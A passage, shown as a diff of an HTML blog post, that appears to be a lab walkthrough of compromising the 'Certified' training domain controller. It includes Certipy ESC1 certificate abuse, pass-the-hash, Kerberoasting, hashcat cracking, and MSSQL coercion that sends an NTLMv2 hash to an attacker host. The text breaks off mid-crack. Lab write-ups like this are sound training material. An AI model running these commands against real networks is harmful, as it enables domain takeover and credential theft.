@@ -282,8 +282,402 @@ PRE2K       10.129.229.25   389    CERTIFIED        <span class="o">[</span>+] S
 
 <p>Alright, I’m going to save you a bit of scrolling time. None of our other commands above were helped by this user account. Lets try some privilege escalation.</p>
 
-<p>Lets start with my go-to Certipy-ad. Certipy is like</p>
+<p>Lets start with my go-to Certipy-ad. Certipy is like having cheats codes. It is <ins><strong><em>nuts</em></strong></ins>.</p>
 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>certipy-ad find <span class="nt">-u</span> ldapusr <span class="nt">-p</span> ldapisfun  <span class="nt">-dc-ip</span> 10.129.229.25
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 34 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 12 enabled certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'CERTIFIED-CA'</span> via CSRA
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'CERTIFIED-CA'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved BloodHound data to <span class="s1">'20250518163718_Certipy.zip'</span><span class="nb">.</span> Drag and drop the file into the BloodHound GUI from @ly4k
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved text output to <span class="s1">'20250518163718_Certipy.txt'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved JSON output to <span class="s1">'20250518163718_Certipy.json'</span>
+
+</code></pre></div></div>
+
+<p>In this case certipy gave us two awesome tools.</p>
+
+<p>A) We’ve got a domain dump for bloodhound.</p>
+
+<p>B) We found a vulnerable template.</p>
+
+<p>There is a template named Auth that is vulnerable to privilege escalation straight to Domain Admin. All you need is a user with the correct enrollment permissions.</p>
+
+<h3 id="exploiting---pwning-and-then-exploiting---pwning-again">Exploiting -&gt; Pwning and then Exploiting -&gt; Pwning again.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\Domain Users
+                                          CERTIFIED.HTB\Enterprise Read-only Domain Controllers
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Domain Controllers
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Authenticated Users
+                                          CERTIFIED.HTB\Enterprise
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Certificate Templates
+  0
+    Template Name                       : Auth
+    Display Name                        : Auth
+    Certificate Authorities             : CERTIFIED-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : SubjectAltRequireDomainDns
+                                          EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : KDC Authentication
+                                          Smart Card Logon
+                                          Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\Domain Users
+                                          CERTIFIED.HTB\Enterprise Read-only Domain Controllers
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Domain Controllers
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Authenticated Users
+                                          CERTIFIED.HTB\Enterprise Domain Controllers
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+        Write Property Principals       : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'CERTIFIED.HTB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
+</code></pre></div></div>
+
+<p>Abusing the hell out of that certificate is now easy.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>certipy-ad account <span class="nt">-u</span> <span class="s1">'ldapusr'</span> <span class="nt">-p</span> <span class="s1">'ldapisfun'</span> <span class="nt">-dc-ip</span> 10.129.229.25 <span class="nt">-user</span> <span class="s1">'administrator'</span> <span class="nb">read     
+</span>Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading attributes <span class="k">for</span> <span class="s1">'Administrator'</span>:
+    cn                                  : Administrator
+    distinguishedName                   : <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>certified,DC<span class="o">=</span>htb
+    name                                : Administrator
+    objectSid                           : S-1-5-21-1150090003-2740091071-2719530230-500
+    sAMAccountName                      : Administrator
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>certipy-ad req <span class="se">\ </span>   
+    <span class="nt">-u</span> <span class="s1">'ldapusr@certified.htb'</span> <span class="nt">-p</span> <span class="s1">'ldapisfun'</span> <span class="se">\</span>
+    <span class="nt">-dc-ip</span> <span class="s1">'10.129.229.25'</span> <span class="nt">-target</span> <span class="s1">'CERTIFIED.certified.htb'</span> <span class="se">\</span>
+    <span class="nt">-ca</span> <span class="s1">'CERTIFIED-CA'</span> <span class="nt">-template</span> <span class="s1">'Auth'</span> <span class="se">\</span>
+    <span class="nt">-upn</span> <span class="s1">'administrator@certified.htb'</span> <span class="nt">-sid</span> <span class="s1">'S-1-5-21-1150090003-2740091071-2719530230-500'</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 19
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'administrator@certified.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator.pfx'</span>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span><span class="nb">sudo </span>ntpdate 10.129.229.25                                                                            
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+2025-05-18 17:01:24.870218 <span class="o">(</span><span class="nt">-0400</span><span class="o">)</span> +911.207016 +/- 0.200149 10.129.229.25 s1 no-leap
+CLOCK: <span class="nb">time </span>stepped by 911.207016
+                                                                                                                                                                                                       
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>certipy-ad auth <span class="nt">-pfx</span> <span class="s1">'administrator.pfx'</span> <span class="nt">-dc-ip</span> <span class="s1">'10.129.229.25'</span>
+Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@certified.htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@certified.htb'</span>: aad3b435b51404eeaad3b435b51404ee:ee778b86e5fa6072152e9e8d498e740b
+
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>impacket-smbclient <span class="s1">'administrator@10.129.229.25'</span> <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:ee778b86e5fa6072152e9e8d498e740b
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+<span class="c"># who</span>
+host:   <span class="se">\\</span>10.10.14.22, user: administrator, active:     3, idle:     0
+
+</code></pre></div></div>
+<p>That was almost too easy. I actually think this was not the intended attack path. There’s something interesting I noted about this server.</p>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Lets ignore our cheat code for a minute.</p>
+
+<p>When I first got access to that ldapusr, I tried something else.</p>
+
+<p>Kerberoasting.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>GetUserSPNs.py certified.htb/ldapusr:ldapisfun <span class="nt">-dc-ip</span> 10.129.229.25 <span class="nt">-request</span>
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName         Name         MemberOf  PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">---------------------------</span>  <span class="nt">-----------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+MSSQLSvc/CERTIFIED.htb:1433  MSSQLSERVER            2023-01-12 00:15:26.374709  2023-01-12 00:17:39.341388             
+
+
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="nv">$krb5tgs$23$*</span>MSSQLSERVER<span class="nv">$CERTIFIED</span>.HTB<span class="nv">$certified</span>.htb/MSSQLSERVER<span class="k">*</span><span class="nv">$2d901e78805a315c120f811b154ca618$31f55956be5fb1016e313fb0028a571e3716ca353403814a49c0cd55dca4f4285768958f791e2b2aa777b156f346e12d3ac0b5e45ed34bb5ccf3a6910705b1b977dd64715594b0abf2a0d596d15d2dfcf4fccffc275fc35efd7e31046bad5909ed13ae58d3fde50ce47d659ad5c7719e561d9b151c6cec2b534703c9c89aaa92b9958e4a09c72911334a625cbee260fc5db5c611edee1bbcf8136148aaec2a3bc6c299758d36956390c34bd827ac37c982b6d7568b8828cf1c3295ed159b5cda88be9ee3c9ba58315597d85250e7172fc911a0a4dc2fc3169509de54bc6e81c06b057cc78438233edbe38a43e74ff774e35f539bde556d54d7d03c665b0f1af11045c751ff1126ec73e84e0cf8640e76ce36f4ae248f25194ae5b8b0632b07e70eef19524f2190973bf6ab355efe30cd028453f91461b7f43bbc8024e989a48e80410cc4553ff309bd60e2f9b34c64183d4b03eb12ccf6fc11d8b2255855ea9948b3dc669f23201c5df89eb860cf80be4eecc0289d5afb422fb6cce1822494d9ed3f839905c622ffe5ab4e7b58f2fc476f00a1edcc78f3197cb5b38870862fee60be66a9139ed4f51314f666b350cd56858e132fb8d9a07caa57d45b15bdfeac843f67ddfa4c933b9b856a0cdcb1a78e20098f2dc02c9e3bad23e83ee4365efd4eafca7d7edb3d70d58b823bb7b92d3c7925dcf3a788df421ecf9c3feea7ed363f4826ecd8785c3445b76e30f2b2083aed21d01439657d8e4eaf93c4c1f4d098b2f81c7202cd9c9a35908f89c522fe06dbe8885e34a2a7f63491687cf2228c26220a673e704df09d428eef65db3cd26e5798dcf3b7aa3783a5cfb432219a838ce71267fe36b63964ca20e334f5da516b9d420aed1d2c67903d02f3fe7fc07d90cdb8eaf295dfcc7e5aae41f02c687bf33c0e246682318d3d140208ffc2c4aa257ab5a814f7d863a47882785d20de7294459301ff52ce4cbb3b74b6d924a52c30627a16d2ecaefdbf6e169b44d842c5d4fbe2041b38aac5dec0932c621c9a8847a49cdd152e1c8f64ef33baed703af9b4b81231bdb206e5aa922c167e88785c63474b9ece22a9eaa606ff4b62845e2e7ae9dd211374d80aef82058d26d562b60d21d4344a6a1fd31c4652cd6ed1861fee4bf5f9613feab90157f98ee4a64b0dd9bd95f86e25b35f2034ce4138fc26e6d8cb22796b56dc299e91772d8dfb7c42991cb59f575f625372ae5143f37c91ddd5d4e8d52ad8acd0129f118361d4a112fc871f4155cb7f18f9f13b8542225ffc460239155ff86a4da5013008e1a22c97232968e59d88fa4ee61c4543a836bd3e3dd80ccf8b07d46c794ff99700f0c84b5fa032a45d31c9afbdc7a343eb8d3167b62b76b20be1f1ff6f25b7bd6681</span>
+
+</code></pre></div></div>
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Lets get cracking! (Hashcat is the bugatti)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>hashcat <span class="nt">-m</span> 13100 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt 
+hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+
+OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
+<span class="o">============================================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: cpu-sandybridge-AMD Ryzen 7 4800HS with Radeon Graphics, 2913/5891 MB (1024 MB allocatable), 4MCU</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Not-Iterated
+<span class="k">*</span> Single-Hash
+<span class="k">*</span> Single-Salt
+
+ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append <span class="nt">-O</span> to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c
+
+Host memory required <span class="k">for </span>this attack: 1 MB
+
+Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344392
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+<span class="k">*</span> Runtime...: 2 secs
+
+<span class="nv">$krb5tgs$23$*</span>MSSQLSERVER<span class="nv">$CERTIFIED</span>.HTB<span class="nv">$certified</span>.htb/MSSQLSERVER<span class="k">*</span><span class="nv">$2d901e78805a315c120f811b154ca618$31f55956be5fb1016e313fb0028a571e3716ca353403814a49c0cd55dca4f4285768958f791e2b2aa777b156f346e12d3ac0b5e45ed34bb5ccf3a6910705b1b977dd64715594b0abf2a0d596d15d2dfcf4fccffc275fc35efd7e31046bad5909ed13ae58d3fde50ce47d659ad5c7719e561d9b151c6cec2b534703c9c89aaa92b9958e4a09c72911334a625cbee260fc5db5c611edee1bbcf8136148aaec2a3bc6c299758d36956390c34bd827ac37c982b6d7568b8828cf1c3295ed159b5cda88be9ee3c9ba58315597d85250e7172fc911a0a4dc2fc3169509de54bc6e81c06b057cc78438233edbe38a43e74ff774e35f539bde556d54d7d03c665b0f1af11045c751ff1126ec73e84e0cf8640e76ce36f4ae248f25194ae5b8b0632b07e70eef19524f2190973bf6ab355efe30cd028453f91461b7f43bbc8024e989a48e80410cc4553ff309bd60e2f9b34c64183d4b03eb12ccf6fc11d8b2255855ea9948b3dc669f23201c5df89eb860cf80be4eecc0289d5afb422fb6cce1822494d9ed3f839905c622ffe5ab4e7b58f2fc476f00a1edcc78f3197cb5b38870862fee60be66a9139ed4f51314f666b350cd56858e132fb8d9a07caa57d45b15bdfeac843f67ddfa4c933b9b856a0cdcb1a78e20098f2dc02c9e3bad23e83ee4365efd4eafca7d7edb3d70d58b823bb7b92d3c7925dcf3a788df421ecf9c3feea7ed363f4826ecd8785c3445b76e30f2b2083aed21d01439657d8e4eaf93c4c1f4d098b2f81c7202cd9c9a35908f89c522fe06dbe8885e34a2a7f63491687cf2228c26220a673e704df09d428eef65db3cd26e5798dcf3b7aa3783a5cfb432219a838ce71267fe36b63964ca20e334f5da516b9d420aed1d2c67903d02f3fe7fc07d90cdb8eaf295dfcc7e5aae41f02c687bf33c0e246682318d3d140208ffc2c4aa257ab5a814f7d863a47882785d20de7294459301ff52ce4cbb3b74b6d924a52c30627a16d2ecaefdbf6e169b44d842c5d4fbe2041b38aac5dec0932c621c9a8847a49cdd152e1c8f64ef33baed703af9b4b81231bdb206e5aa922c167e88785c63474b9ece22a9eaa606ff4b62845e2e7ae9dd211374d80aef82058d26d562b60d21d4344a6a1fd31c4652cd6ed1861fee4bf5f9613feab90157f98ee4a64b0dd9bd95f86e25b35f2034ce4138fc26e6d8cb22796b56dc299e91772d8dfb7c42991cb59f575f625372ae5143f37c91ddd5d4e8d52ad8acd0129f118361d4a112fc871f4155cb7f18f9f13b8542225ffc460239155ff86a4da5013008e1a22c97232968e59d88fa4ee61c4543a836bd3e3dd80ccf8b07d46c794ff99700f0c84b5fa032a45d31c9afbdc7a343eb8d3167b62b76b20be1f1ff6f25b7bd6681</span>:lucky7
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 <span class="o">(</span>Kerberos 5, etype 23, TGS-REP<span class="o">)</span>
+Hash.Target......: <span class="nv">$krb5tgs$23$*</span>MSSQLSERVER<span class="nv">$CERTIFIED</span>.HTB<span class="nv">$certified</span>.ht...bd6681
+Time.Started.....: Sun May 18 13:30:06 2025 <span class="o">(</span>0 secs<span class="o">)</span>
+Time.Estimated...: Sun May 18 13:30:06 2025 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:    17194 H/s <span class="o">(</span>2.64ms<span class="o">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 2048/14344385 <span class="o">(</span>0.01%<span class="o">)</span>
+Rejected.........: 0/2048 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 0/14344385 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&gt; lovers1
+Hardware.Mon.#1..: Util: 26%
+</code></pre></div></div>
+
+<p>Alright, alright. So, lets ignore that certificate template for now. We have access to this MSSQL server. Lets see what we can do.</p>
+
+<p>Lets enumerate this MSSQL account and what is it can do.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-L</span>    
+LOW PRIVILEGE MODULES
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> enum_impersonate          Enumerate <span class="nb">users </span>with impersonation privileges
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> enum_logins               Enumerate SQL Server logins
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> exec_on_link              Execute commands on a SQL Server linked server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> link_enable_xp            Enable or disable xp_cmdshell on a linked SQL server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> link_xpcmd                Run xp_cmdshell commands on a linked SQL server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql_priv                Enumerate and exploit MSSQL privileges
+
+HIGH PRIVILEGE MODULES <span class="o">(</span>requires admin privs<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> empire_exec               Uses Empires RESTful API to generate a launcher <span class="k">for </span>the specified listener and executes it
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> enum_links                Enumerate linked SQL Servers and their login configurations.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> met_inject                Downloads the Meterpreter stager and injects it into memory
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> test_connection           Pings a host
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
+                                                                                                                                                                                                                                                                                                                                                
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-M</span> mssql_priv
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:CERTIFIED<span class="o">)</span> <span class="o">(</span>domain:certified.htb<span class="o">)</span>
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span>+] certified.htb<span class="se">\M</span>SSQLSERVER:lucky7 
+                                                                                                                                                                                                       
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-M</span> nanodump  
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ignore OPSEC <span class="k">in </span>configuration is <span class="nb">set </span>and OPSEC unsafe module loaded
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:CERTIFIED<span class="o">)</span> <span class="o">(</span>domain:certified.htb<span class="o">)</span>
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span>+] certified.htb<span class="se">\M</span>SSQLSERVER:lucky7 
+                                                                                                                                                                                 
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-M</span> enum_impersonate
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:CERTIFIED<span class="o">)</span> <span class="o">(</span>domain:certified.htb<span class="o">)</span>
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span>+] certified.htb<span class="se">\M</span>SSQLSERVER:lucky7 
+ENUM_IMP... 10.129.229.25   1433   CERTIFIED        <span class="o">[</span>-] No <span class="nb">users </span>with impersonation rights found.
+                                                                                                                                                                                                       
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-x</span> <span class="nb">whoami          
+</span>MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:CERTIFIED<span class="o">)</span> <span class="o">(</span>domain:certified.htb<span class="o">)</span>
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span>+] certified.htb<span class="se">\M</span>SSQLSERVER:lucky7 
+                                                                                                                                                                                                       
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nxc mssql 10.129.229.25 <span class="nt">-u</span> <span class="s1">'MSSQLSERVER'</span> <span class="nt">-p</span> <span class="s1">'lucky7'</span> <span class="nt">-M</span> mssql_coerce <span class="nt">-o</span> <span class="nv">L</span><span class="o">=</span>10.10.14.22
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:CERTIFIED<span class="o">)</span> <span class="o">(</span>domain:certified.htb<span class="o">)</span>
+MSSQL       10.129.229.25   1433   CERTIFIED        <span class="o">[</span>+] certified.htb<span class="se">\M</span>SSQLSERVER:lucky7 
+MSSQL_CO... 10.129.229.25   1433   CERTIFIED        <span class="o">[</span>-] Failed to execute <span class="nb">command</span>: xp_fileexist <span class="s1">'\\10.10.14.22\file'</span><span class="p">;</span>, Error: timed out
+MSSQL_CO... 10.129.229.25   1433   CERTIFIED        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Commands executed successfully, check the listener <span class="k">for </span>results
+                                                                                                                                                    
+</code></pre></div></div>
+
+<p>Alright… fingers crossed. Lets check responder….</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.129.229.25
+<span class="o">[</span>SMB] NTLMv2-SSP Username : CERTIFIEDDC<span class="se">\t</span>homas
+<span class="o">[</span>SMB] NTLMv2-SSP Hash     : thomas::CERTIFIEDDC:8332ddfafce5eb4f:133B9C37B80193768B01C03312012681:010100000000000080AA284C1AC8DB01467ABC1463E5B07C0000000002000800470037003100590001001E00570049004E002D004C00420045005100390059005200410059004900340004003400570049004E002D004C0042004500510039005900520041005900490034002E0047003700310059002E004C004F00430041004C000300140047003700310059002E004C004F00430041004C000500140047003700310059002E004C004F00430041004C000700080080AA284C1AC8DB010600040002000000080030003000000000000000000000000030000061B01F7990EF198FBBCAC5835D9AB9D64C2DE5811D6C3C117C768A5CA8377F510A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000                                                                                        
+</code></pre></div></div>
+
+<p>UUUUEIIIIIIIII!!! Not too shabby…</p>
+
+<p>As you (probably don’t) remember from earlier (I forgot too) SMB signing IS enabled on the DC, so we’ll have to crack this hash again.</p>
+
+<blockquote>
+  <p>Insert bugatti joke here</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>hashcat <span class="nt">-m</span> 5600 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt 
+hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+
+OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
+<span class="o">============================================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: cpu-sandybridge-AMD Ryzen 7 4800HS with Radeon Graphics, 2913/5891 MB (1024 MB allocatable), 4MCU</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Not-Iterated
+<span class="k">*</span> Single-Hash
+<span class="k">*</span> Single-Salt
+
+ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append <span class="nt">-O</span> to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c
+
+Host memory required <span class="k">for </span>this attack: 1 MB
+
+Dictionary cache hit:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344385
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+
